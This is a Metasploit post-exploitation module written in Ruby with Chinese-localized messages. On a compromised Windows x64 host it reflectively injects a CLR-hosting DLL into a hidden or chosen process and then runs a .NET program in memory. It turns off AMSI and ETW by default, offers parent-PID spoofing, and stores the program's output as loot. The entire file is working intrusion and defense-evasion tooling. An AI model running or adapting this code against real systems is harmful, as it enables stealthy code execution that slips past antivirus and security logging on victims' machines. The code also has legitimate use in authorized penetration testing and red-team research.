# -*- coding: UTF-8 -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Post::Windows::Dotnet

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '内存中执行.net程序 (windows x64环境)',
        'Description' => %q{
          本模块在内存中执行.net程序，使用反射注入DLL的方式运行，可以绕过AMSI/ETW。
          Credits for Amsi bypass to Rastamouse (@_RastaMouse)
        },
        'License' => MSF_LICENSE,
        'Author' => ['b4rtik','3ricK5r'],
        'Arch' => [ARCH_X64],
        'Platform' => 'win',
        'SessionTypes' => ['meterpreter'],
        'Targets' => [['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]],
        'References' => [['URL', 'https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html']],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        OptPath.new('DOTNET_EXE', [true, '.net程序路径']),
        OptString.new('ARGUMENTS', [false, '命令行参数（必须为字符串）']),
        OptString.new('PROCESS', [false, '准备启动的进程名称', 'notepad.exe']),
        OptString.new('USETHREADTOKEN', [false, '使用线程模拟生成进程', true]),
        OptInt.new('PID', [false, '注入到的Pid', 0]),
        OptInt.new('PPID', [false, '创建新进程时用于 PPID spoofing 的进程标识符。 (0 = no PPID spoofing)', 0]),
        OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
        OptBool.new('ETWBYPASS', [true, 'Enable Etw bypass', true]),
        OptInt.new('WAIT', [false, '进程运行后等待其执行的时间（单位：秒）', 10]),
        OptInt.new('TIMEOUT', [false, '等待返回结果的超时时间（单位：秒）', 600])
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('KILL', [true, '任务结束之后关闭进程', false])
      ]
    )
  end

  def find_required_clr(exe_path)
    filecontent = File.read(exe_path).bytes
    sign = 'v4.0.30319'.bytes
    filecontent.each_with_index do |_item, index|
      sign.each_with_index do |subitem, indexsub|
        break if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)

        if indexsub == 9
          vprint_status('信息：需要的.net framework版本：v4.0.30319')
          return 'v4.0.30319'
        end
      end
    end
    vprint_status('信息：需要的.net framework版本：v2.0.50727')
    'v2.0.50727'
  end

  def check_requirements(clr_req, installed_dotnet_versions)
    installed_dotnet_versions.each do |fi|
      # if clr_req == 'v4.0.30319'
      #   if fi[0] == '4'
      #     vprint_status('Requirements ok')
      #     return true
      #   end
      # elsif fi[0] == '3'
      #   vprint_status('Requirements ok')
      #   return true
      # end
      if clr_req[1] == fi[0]
        vprint_status('信息：.net framework版本匹配成功')
        return true
      end
    end
    print_error('错误：没有找到合适的.net framework版本！')
    false
  end

  def run
    exe_path = datastore['DOTNET_EXE']
    unless File.file?(exe_path)
      fail_with(Failure::BadConfig, '错误：没有找到.net运行程序（DOTNET_EXE）！')
    end
    
    if not (client.platform == 'windows' && client.arch == ARCH_X64)
      print_error("错误：客户机运行的payload必须是windows x64！当前客户机运行的payload是：#{client.platform} #{client.arch}")
      print_status('信息：如果使用32位的payload，请执行migrate迁移到64位的程序（比如：explorer.exe）')
      fail_with(Failure::BadConfig, '')
    end

    installed_dotnet_versions = get_dotnet_versions
    vprint_status("信息：客户机安装的.net framework版本：#{installed_dotnet_versions}")
    if installed_dotnet_versions == []
      fail_with(Failure::BadConfig, '错误：客户机没有安装.net framework环境！')
    end
    rclr = find_required_clr(exe_path)
    if check_requirements(rclr, installed_dotnet_versions) == false
      fail_with(Failure::BadConfig, '错误：客户机没有安装的需要的.net framework版本！')
    end
    execute_assembly(exe_path)
  end

  def sanitize_process_name(process_name)
    if process_name.split(//).last(4).join.eql? '.exe'
      out_process_name = process_name
    else
      process_name + '.exe'
    end
    out_process_name
  end

  def pid_exists(pid)
    mypid = client.sys.process.getpid.to_i

    if pid == mypid
      print_bad('错误：您不能选择当前进程作为注入目标进程！')
      return false
    end

    host_processes = client.sys.process.get_processes
    if host_processes.empty?
      print_bad('错误：客户机上没有找到运行的目标进程！')
      return false
    end

    theprocess = host_processes.find { |x| x['pid'] == pid }

    !theprocess.nil?
  end

  def launch_process
    if (datastore['PPID'] != 0) && !pid_exists(datastore['PPID'])
      print_error("错误：进程 #{datastore['PPID']} 没找到！")
      return false
    elsif datastore['PPID'] != 0
      print_status("信息：Spoofing PPID #{datastore['PPID']}")
    end
    process_name = sanitize_process_name(datastore['PROCESS'])
    print_status("信息：运行进程 #{process_name} ...")
    channelized = true
    channelized = false if datastore['PID'].positive?

    impersonation = true
    impersonation = false if datastore['USETHREADTOKEN'] == false

    process = client.sys.process.execute(process_name, nil, {
      'Channelized' => channelized,
      'Hidden' => true,
      'UseThreadToken' => impersonation,
      'ParentPid' => datastore['PPID']
    })
    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
    print_good("步骤：进程 #{hprocess.pid} 启动完成")
    [process, hprocess]
  end

  def inject_hostclr_dll(process)
    print_status("信息：准备反射注入DLL到进程 #{process.pid} 中...")

    library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-dotnet-assembly', 'HostingCLRx64.dll')
    library_path = ::File.expand_path(library_path)

    print_status("信息：正在注入进程 #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    [exploit_mem, offset]
  end

  def open_process
    pid = datastore['PID'].to_i

    if pid_exists(pid)
      print_status("信息：打开进程 #{datastore['PID']} 的句柄...")
      hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
      print_good('步骤：句柄已经打开')
      [nil, hprocess]
    else
      print_bad("错误：未找到进程 Pid：#{datastore['PID']}")
      [nil, nil]
    end
  end

  def execute_assembly(exe_path)
    if sysinfo.nil?
      fail_with(Failure::BadConfig, '错误：无效Session！')
    else
      print_status("信息：在客户机 #{sysinfo['Computer']} 上运行模块")
    end
    if datastore['PID'].positive? || datastore['WAIT'].zero? || datastore['PPID'].positive?
      print_warning('错误：无效输出！')
    end

    if (datastore['PPID'] != 0) && (datastore['PID'] != 0)
      print_error('错误：PID 和 PPID 是互不相容的！')
      return false
    end

    if datastore['PID'] <= 0
      process, hprocess = launch_process
    else
      process, hprocess = open_process
    end

    exploit_mem, offset = inject_hostclr_dll(hprocess)

    assembly_mem = copy_assembly(exe_path, hprocess)

    print_status('信息：执行中...')
    hprocess.thread.create(exploit_mem + offset, assembly_mem)

    sleep(datastore['WAIT']) if datastore['WAIT'].positive?

    if (datastore['PID'] <= 0) && datastore['WAIT'].positive? && (datastore['PPID'] <= 0)
      read_output(process)
    end

    if datastore['KILL']
      print_good("步骤：关闭进程 #{hprocess.pid}")
      client.sys.process.kill(hprocess.pid)
    end

    print_good('步骤：执行结束')
  end

  def copy_assembly(exe_path, process)
    print_status("信息：注入完成，下面将.net程序拷贝到进程 #{process.pid} 中...")
    int_param_size = 8
    amsi_flag_size = 1
    etw_flag_size = 1
    assembly_size = File.size(exe_path)
    if datastore['ARGUMENTS'].nil?
      argssize = 1
    else
      argssize = datastore['ARGUMENTS'].size + 1
    end
    payload_size = amsi_flag_size + etw_flag_size + int_param_size
    payload_size += assembly_size + argssize
    assembly_mem = process.memory.allocate(payload_size, PAGE_READWRITE)
    params = [assembly_size].pack('I*')
    params += [argssize].pack('I*')
    if datastore['AMSIBYPASS'] == true
      params += "\x01"
    else
      params += "\x02"
    end
    if datastore['ETWBYPASS'] == true
      params += "\x01"
    else
      params += "\x02"
    end
    if datastore['ARGUMENTS'].nil?
      params += ''
    else
      params += datastore['ARGUMENTS']
    end
    params += "\x00"

    process.memory.write(assembly_mem, params + File.read(exe_path))
    print_good('步骤：.net程序拷贝完成')
    assembly_mem
  end

  def read_output(process)
    print_status('信息：开始读取.net程序运行输出信息')
    old_timeout = client.response_timeout
    client.response_timeout = datastore['TIMEOUT'] if datastore['TIMEOUT'].positive?

    outputs = ""
    begin
      loop do
        output = process.channel.read
        if !output.nil? && !output.empty?
          output.split("\n").each { |x| 
            print_good(x.force_encoding("GBK").encode("UTF-8"))
            outputs << x.force_encoding("GBK").encode("UTF-8") << "\n"
          }
        end
        next if output.nil? || output.empty?
        break if output.include? 'Execute Assembly Succeeded' or output.include? 'Failed pMethodInfo->Invoke_3'
      end
    rescue Rex::TimeoutError => e
      vprint_warning("异常：读取输出信息，空闲时间超时#{client.response_timeout}秒")
    rescue ::StandardError => e
      print_error("异常：#{e.inspect}")
    end

    client.response_timeout = old_timeout
    print_status('信息：读取输出信息结束')

    if outputs != ""
      path = store_loot("dotnet.assembly.output", "text/plain", session, outputs, "dotnet.assembly.output.txt", "dotnet assembly output Data")
      print_good("步骤：输出信息保存文件：#{path}")
    end
  end
end
